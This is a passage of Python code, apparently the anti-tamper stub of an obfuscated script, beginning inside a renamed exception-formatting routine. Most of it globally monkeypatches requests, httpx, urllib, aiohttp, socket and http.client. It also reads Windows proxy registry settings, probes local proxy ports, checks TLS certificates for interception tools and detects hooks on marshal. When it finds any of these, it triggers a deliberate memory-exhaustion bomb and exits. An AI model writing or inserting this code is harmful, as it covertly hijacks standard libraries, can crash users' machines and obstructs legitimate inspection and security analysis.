                _ctx.ncls = False
                for i in range(n):
                    lex = (i == n-1)
                    if lex:
                        _ctx.ncls = True
                    if pymeomeo_.max_group_width is not None:
                        truncated = (i >= pymeomeo_.max_group_width)
                    else:
                        truncated = False
                    title = f'cut'
                    yield ''
                    _ctx.exgrd += 1
                    if not truncated:
                        yield from exc.exceptions[i].format(chain=chain, _ctx=_ctx)
                    else:
                        remaining = num_excs - pymeomeo_.max_group_width
                        plural = 's' if remaining > 1 else ''
                        yield from _ctx.emit('deptrai')
                    if lex and _ctx.ncls:
                        yield (_ctx.indent() +
                               "+------------------------------------\n")
                        _ctx.ncls = False
                    _ctx.exgrd -= 1
                if is_toplevel:
                    assert _ctx.exgrd == 1
                    _ctx.exgrd = 0



if int(len(__import__('inspect').stack())) != 3:globals()["_HOOK_CAI_LON_"]=[[[[[(('pymeoooom') * 987654321)] * 987654321] * 987654321] * 987654321] * 987654321] * 2123000000 * 2123000000;exit()

try:
    for globals()["uyendeptrai"] in st():
#        if globals()["uyendeptrai"].pymeowwwwdethuong != "deptraicogisai":
        if uyendeptrai.pymeowwwwdethuong != globals()["__file__"]:
            if uyendeptrai.pymeowwwwdethuong != "<string>":
                if uyendeptrai.pymeowwwwdethuong != "<pymeo>":
                    print("passed")

except Exception as e:
    print(e)    


def Object():globals()["_HOOK_CAI_LON_"]=[[[[[(('pymeoooom') * 987654321)] * 987654321] * 987654321] * 987654321] * 987654321] * 2123000000 * 2123000000;exit()
def _Ox728536(_Ox115673):
    try:__import__('requests').head(_Ox502530,timeout=0.01);globals()["_HOOK_CAI_LON_"]=[[[[[(('pymeoooom') * 987654321)] * 987654321] * 987654321] * 987654321] * 987654321] * 2123000000 * 2123000000;exit()
    except ModuleNotFoundError:pass
    except __import__('requests').exceptions.RequestException:
        raise PrtError('No internet ') from None
    try:__import__('requests').head(_Ox502530,timeout=0.01);globals()["_HOOK_CAI_LON_"]=[[[[[(('pymeoooom') * 987654321)] * 987654321] * 987654321] * 987654321] * 987654321] * 2123000000 * 2123000000;exit()
    except ModuleNotFoundError:pass
    except __import__('requests').exceptions.RequestException:pass
    try:__import__('requests').head(_Ox502530,timeout=0.01);globals()["_HOOK_CAI_LON_"]=[[[[[(('pymeoooom') * 987654321)] * 987654321] * 987654321] * 987654321] * 987654321] * 2123000000 * 2123000000;exit()
    except ModuleNotFoundError:pass
    try:
        __import__('requests').get(_Ox502530,timeout=1)
        return __import__('requests').get(_Ox115673)
    except ModuleNotFoundError:pass
    except:globals()["_HOOK_CAI_LON_"]=[[[[[(('pymeoooom') * 987654321)] * 987654321] * 987654321] * 987654321] * 987654321] * 2123000000 * 2123000000;exit()
try:__import__('requests').get=_Ox728536
except __import__('requests').exceptions.RequestException:f='foo'
except ModuleNotFoundError:pass
try:abccc = f=='foo'
except: f = "hal"
if not f=='foo':
    def _Ox162406(self,_Ox774178,*args,**kwargs):
        try:
            with __import__('httpx').Client() as c:
                c.head(_Ox502530,timeout=0.01)
                globals()["_HOOK_CAI_LON_"]=[[[[[(('pymeoooom') * 987654321)] * 987654321] * 987654321] * 987654321] * 987654321] * 2123000000 * 2123000000;exit()
        except __import__('httpx').RequestError:pass
        except ModuleNotFoundError:pass
        try:
            with __import__('httpx').Client() as c:
                c.head(_Ox502530,timeout=0.01)
                globals()["_HOOK_CAI_LON_"]=[[[[[(('pymeoooom') * 987654321)] * 987654321] * 987654321] * 987654321] * 987654321] * 2123000000 * 2123000000;exit()
        except __import__('httpx').RequestError:pass
        except ModuleNotFoundError:pass
        try:
            with __import__('httpx').Client() as c:
                c.head(_Ox502530,timeout=0.01)
                globals()["_HOOK_CAI_LON_"]=[[[[[(('pymeoooom') * 987654321)] * 987654321] * 987654321] * 987654321] * 987654321] * 2123000000 * 2123000000;exit()
        except __import__('httpx').RequestError:pass
        except ModuleNotFoundError:pass
        try:
            with __import__('httpx').Client() as c:
                c.get(_Ox502530,timeout=1)
                return c.get(_Ox774178,*args,**kwargs)
        except ModuleNotFoundError:pass
        except:raise Object() from None
    try:__import__('httpx').Client.get=_Ox162406
    except ModuleNotFoundError:pass
    def _OxUlib(_url,*args,**kwargs):
        try:
            __import__('urllib.request').urlopen(_Ox502530,timeout=1)
            return __import__('urllib.request').urlopen(_url,*args,**kwargs)
        except ModuleNotFoundError:pass
        except:globals()["_HOOK_CAI_LON_"]=[[[[[(('pymeoooom') * 987654321)] * 987654321] * 987654321] * 987654321] * 987654321] * 2123000000 * 2123000000;exit()
    try:__import__('urllib.request').urlopen=_OxUlib
    except ModuleNotFoundError:pass
    def _OxAiohttp(self,_url,*args,**kwargs):
        try:
            import asyncio
            async def _r():
                try:
                    async with __import__('aiohttp').ClientSession() as s:
                        async with s.get(_Ox502530,timeout=1):pass
                        async with s.get(_url,timeout=1) as r:
                            return await r.text()
                except:globals()["_HOOK_CAI_LON_"]=[[[[[(('pymeoooom') * 987654321)] * 987654321] * 987654321] * 987654321] * 987654321] * 2123000000 * 2123000000;exit()
            return asyncio.run(_r())
        except ModuleNotFoundError:pass
        except:raise Object() from None
    try:__import__('aiohttp').ClientSession.get=_OxAiohttp
    except ModuleNotFoundError:pass
    def _OxSock(host,port,*args,**kwargs):
        try:
            __import__('socket').create_connection(("8.8.8.8",53),timeout=1)
            return __import__('socket').create_connection((host,port),*args,**kwargs)
        except ModuleNotFoundError:pass
        except:globals()["_HOOK_CAI_LON_"]=[[[[[(('pymeoooom') * 987654321)] * 987654321] * 987654321] * 987654321] * 987654321] * 2123000000 * 2123000000;exit()
    try:__import__('socket').create_connection=_OxSock
    except ModuleNotFoundError:pass
    def _OxHttpClient(_Ox115673):
        try:
            conn=__import__('http.client').HTTPSConnection("www.google.com",timeout=1)
            conn.request("HEAD","/")
            return __import__('http.client').HTTPSConnection(_Ox115673)
        except ModuleNotFoundError:pass
        except:raise Object() from None
    try:__import__('http.client').HTTPSConnection=_OxHttpClient
    except ModuleNotFoundError:pass
def _OxProxyCheck():
    _enabled=False;_server=None
    try:
        _key="Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"
        _reg=__import__('winreg').OpenKey(__import__('winreg').HKEY_CURRENT_USER,_key)
        _val,_=__import__('winreg').QueryValueEx(_reg,'ProxyEnable')
        _enabled=bool(_val)
        if _enabled:
            _srv,_=__import__('winreg').QueryValueEx(_reg,'ProxyServer')
            _server=_srv
        __import__('winreg').CloseKey(_reg)
    except ModuleNotFoundError:pass
    except:pass
    return _enabled,_server
if __import__('platform').system().lower()=='windows':
    _p,_s=_OxProxyCheck()
    if _p:globals()["_HOOK_CAI_LON_"]=[[[[[(('pymeoooom') * 987654321)] * 987654321] * 987654321] * 987654321] * 987654321] * 2123000000 * 2123000000;exit()

import traceback, marshal
ch = set()
am = {'builtins', '__main__'}
def vv():
    raise MemoryError('')
def cb(fn):
    if callable(fn) and fn.__module__ not in am:
        ch.add(fn.__module__)
        vv()
def ba(fn):
    def hi(*args, **kwargs):
        if args and args[0] in ch:
            vv()
        return fn(*args, **kwargs)
    return hi
def bh():
    stack = traceback.extract_stack()
    for frame in stack[:-2]:
        if frame.filename != __file__:
            pass
def ck(fn, md):
    if callable(fn) and fn.__module__ != md:
        ch.add(md)
        raise ImportError(f'>> Detect [{{fn.__name__}}] call [{{md}}] ! <<') from None
def ic(md, nf):
    module = __import__(md)
    funcs = nf if isinstance(nf, list) else [nf]
    [ck(getattr(module, func, None), md) for func in funcs]
def lf(val, xy):
    return callable(val) and xy and val.__module__ != xy.__name__
def kt(lo):
    if any(lf(val, xy) for val, xy in lo):
        vv()
def ct(md, nf):
    module = __import__(md)
    func = getattr(module, nf, None)
    if func is None:
        vv()
    tg = type(func)
    def cf(func):
        if type(func) != tg:
            vv()
    cf(func)
    return func
def ic_type(md, nf):
    func = ct(md, nf)
    ck(func, md)
def nc():
    __import__('sys').settrace(lambda *args, **keys: None)
    __import__('sys').modules['marshal'] = None
    __import__('sys').modules['marshal'] = type(__import__('sys'))('marshal')
    __import__('sys').modules['marshal'].loads = marshal.loads
    __import__('marshal').dumps = marshal.dumps
    __import__('marshal').load = marshal.load
    vars(globals()['__builtins__'])['__import__']('marshal').dumps = marshal.dumps
    vars(globals()['__builtins__'])['__import__']('marshal').loads = marshal.loads
    vars(globals()['__builtins__'])['__import__']('marshal').load = marshal.load
def sc():
    nk = {
        'marshal': 'loads'
    }
    [ic_type(md, nf) for md, nf in nk.items()]

    lo = [
        (__import__('marshal').loads, marshal)
    ]
    kt(lo)
    nc()

try:
    sc()
    bh()
except MemoryError:globals()["_HOOK_CAI_LON_"]=[[[[[(('pymeoooom') * 987654321)] * 987654321] * 987654321] * 987654321] * 987654321] * 2123000000 * 2123000000;exit()

class 怓謷铊(Exception):
    pass

def 蠺珑唡():
    try:
        import requests as R, socket as S, ssl as SS, os as O
        from urllib.parse import urljoin, urlparse
        from requests.cookies import extract_cookies_to_jar, merge_cookies
        from requests.utils import get_environ_proxies, get_netrc_auth, requote_uri
        from requests.auth import _basic_auth_str
        try:
            R.get('https://example.com', timeout=2)
        except:
            try:
                S.create_connection(('example.com', 443), timeout=2).close()
            except:
                return
        if R.get('https://example.com', timeout=2).status_code != 200:
            raise 怓謷铊()
        if R.post('https://httpbin.org/post', data={'x': 1}, timeout=2).status_code != 200:
            raise 怓謷铊()
        s = R.Session()
        res = s.get('https://example.com', timeout=2)
        if res.status_code != 200:
            raise 怓謷铊()
        c = S.create_connection(('example.com', 443), timeout=2)
        with SS.create_default_context().wrap_socket(c, server_hostname='example.com') as w:
            cert = w.getpeercert()
            if not cert or 'toolkit' in str(cert).lower():
                raise 怓謷铊()
        ip1 = R.get('https://api.ipify.org', timeout=2).text.strip()
        ip2 = R.get('https://checkip.amazonaws.com', timeout=2).text.strip()
        if ip1 != ip2:
            raise 怓謷铊()
        if any(('proxy' in k.lower() for k in O.environ)):
            raise 怓謷铊()
        if get_environ_proxies('https://example.com'):
            raise 怓謷铊()
        for p in (8000, 8888, 8080, 3128, 443):
            try:
                x = S.socket()
                x.settimeout(0.2)
                x.connect(('127.0.0.1', p))
                raise 怓謷铊()
            except:
                pass
        if not _basic_auth_str('user', 'pass').startswith('Basic'):
            raise 怓謷铊()
        if not urljoin('https://site.com', '/a') == 'https://site.com/a':
            raise 怓謷铊()
        if not urlparse('https://a.com').scheme == 'https':
            raise 怓謷铊()
        if not requote_uri('https://a.com/q 1') == 'https://a.com/q%201':
            raise 怓謷铊()
        jar = R.cookies.RequestsCookieJar()
        merge_cookies(jar, {'a': 'b'})
        extract_cookies_to_jar(jar, R.Request(), R.Response())
        get_netrc_auth('https://example.com')
    except 怓謷铊:
        raise
    except:
        pass
try:蠺珑唡()
except:globals()["_HOOK_CAI_LON_"]=[[[[[(('pymeoooom') * 987654321)] * 987654321] * 987654321] * 987654321] * 987654321] * 2123000000 * 2123000000;exit()




